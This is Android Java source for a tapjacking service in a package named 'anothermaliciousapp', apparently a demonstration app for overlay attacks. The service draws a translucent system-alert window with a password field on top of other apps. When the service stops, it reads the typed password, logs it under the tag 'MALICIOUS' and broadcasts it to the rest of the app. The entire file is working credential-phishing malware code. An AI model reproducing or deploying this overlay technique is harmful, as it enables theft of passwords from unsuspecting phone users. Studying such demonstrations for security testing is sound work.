package org.mmm.anothermaliciousapp;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;

public class Tapjacking2Service extends Service {

    private WindowManager windowManager;
    private View view;

    public Tapjacking2Service() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        view = LayoutInflater.from(this).inflate(R.layout.layout_tapjacking2, null);

        android.view.WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                android.view.WindowManager.LayoutParams.WRAP_CONTENT,
                android.view.WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.CENTER;
        params.y += 55;
        params.x += 5;

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        windowManager.addView(view, params);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (view != null) {
            EditText passwordEditText = (EditText) view.findViewById(R.id.tapjacking2Password);
            String password = passwordEditText.getText().toString();
            Log.i("MALICIOUS", "Password: " + password);
            windowManager.removeView(view);
            Intent intent = new Intent();
            intent.setAction("MAIN");
            intent.putExtra("password", "Password: " + password);
            LocalBroadcastManager.getInstance(getApplicationContext()).sendBroadcast(intent);
        }
    }
}
